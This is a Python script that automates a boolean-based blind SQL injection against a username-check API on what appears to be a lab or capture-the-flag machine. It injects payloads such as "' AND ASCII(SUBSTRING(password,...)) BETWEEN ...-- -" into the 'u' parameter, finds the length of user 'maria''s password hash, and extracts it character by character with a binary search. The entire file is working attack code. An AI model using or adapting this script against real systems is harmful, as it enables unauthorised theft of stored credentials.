import requests

# Target information
url = "http://10.129.204.197/api/check-username.php"
user = "maria"

# Proxy configuration
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Function to determine the length of the password hash
def find_hash_length():
    print("[+] Determining the password hash length...")
    for length in range(1, 100):  # Assuming the hash length won't exceed 100
        payload = f"{user}' AND len(password)={length}-- -"
        response = requests.get(url, params={"u": payload}, proxies=proxies, verify=False)
        if "taken" in response.text:
            print(f"[+] Hash length determined: {length}")
            return length
    raise Exception("[-] Could not determine hash length.")

# Function to find the ASCII value of a character using bisection
def find_char_at_position(position):
    low, high = 32, 126  # Printable ASCII range
    print(f"[*] Extracting character at position {position}...")
    
    while low <= high:
        mid = (low + high) // 2

        if low == high:  # Converged to a single value
            char = chr(low)
            print(f"[+] Found character at position {position}: {char}")
            return char

        # Check if the character's ASCII value lies within [low, mid]
        payload = f"{user}' AND ASCII(SUBSTRING(password,{position},1)) BETWEEN {low} AND {mid}-- -"
        response = requests.get(url, params={"u": payload}, proxies=proxies, verify=False)
        
        if "taken" in response.text:
            high = mid  # Character is in the lower half
        else:
            low = mid + 1  # Character is in the upper half
        

    raise Exception(f"[-] Could not find character at position {position}.")

# Function to extract the full hash using the optimized bisection method
def extract_hash(hash_length):
    print("[+] Starting hash extraction...")
    hash_value = ""
    for position in range(1, hash_length + 1):
        char = find_char_at_position(position)
        hash_value += char
        # Print the current state of the hash in progress
        print(f"[!] Hash so far: {hash_value}")
    return hash_value

if __name__ == "__main__":
    try:
        # Step 1: Find the length of the password hash
        hash_length = find_hash_length()

        # Step 2: Extract the full hash using binary search
        password_hash = extract_hash(hash_length)
        # password_hash = extract_hash(1)


        print(f"\n[+] Final Extracted Hash: {password_hash}")
    except Exception as e:
        print(str(e))
